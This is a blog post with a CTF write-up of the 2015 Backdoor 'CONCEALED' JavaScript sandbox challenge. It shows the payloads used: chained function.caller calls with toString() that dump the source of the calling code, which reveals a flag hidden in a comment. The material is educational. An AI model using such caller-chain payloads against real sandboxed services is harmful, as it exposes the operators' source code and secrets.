---
layout: post
title: "Backdoor CTF 2015 - CONCEALED Writeup"
date: 2015-04-03 02:33:31 +0430
comments: false
categories: ctf backdoor exploit javascript sandbox
---

**Backdoor 2015 CONCEALED Writeup**  
**Point = 150**  
**Category = Exploit**  

> All paths have been concealed. Get the hidden flag: nc hack.bckdr.in 8005. Submit sha-256 of the flag

```
$ nc hack.bckdr.in 8005
######################################
####           CONCEAL            ####
######################################

Welcome to CONCEAL
You have access to object named sandboxed and its functions 
Rest everything is sandboxed, don't be a jerk and break something
Wrap your code in a function and return what you want as output
Flag is hidden somewhere in the code. 
Get the flag :D!

home@jail:$ 

```

First of all as banner says we should use all our payload as a function like :
<!--more-->
```
home@jail:$ function exploit() { return "GeeksSpeak"; }
GeeksSpeak
home@jail:$ 
```

After some diging into the the challenge, trying to break the jail and so on, reading banner carefully indicates that the flag is in the code so i should read codes but how?

In javascript we can use arguments.caller to see which function calls our current function so i made up an example and tested it:

```
home@jail:$ function exploit() { return exploit.caller.toString(); }
function () {return (function exploit() { return exploit.caller.toString(); })()}
home@jail:$ function exploit() { return (exploit.caller).caller.toString(); }
function () {
        if (!(this instanceof Script)) {
          throw new TypeError('invalid call to ' + f);
        }
        return ns[f].apply(ns, arguments);
      }
home@jail:$ 

```

this proved my idea, so i used caller repeatedly and finally got the flag as bellow:

```
home@jail:$ function exploit() { return ((((((((exploit.caller).caller).caller).caller).caller).caller).caller).caller).caller.toString(); }
function (err, line) {

    // flag : 50_y0u_f1n4lly_f0und_17

    if (err && wait === false) {
      return callback(err);
    }

    var against = {},
        numericInput,
        isValid;

    if (line !== '') {
      if (schema.properties[propName]) 
      [..stripped..]
```

and sha256 of the `50_y0u_f1n4lly_f0und_17` gives us another 150pts.

HAMIDx9
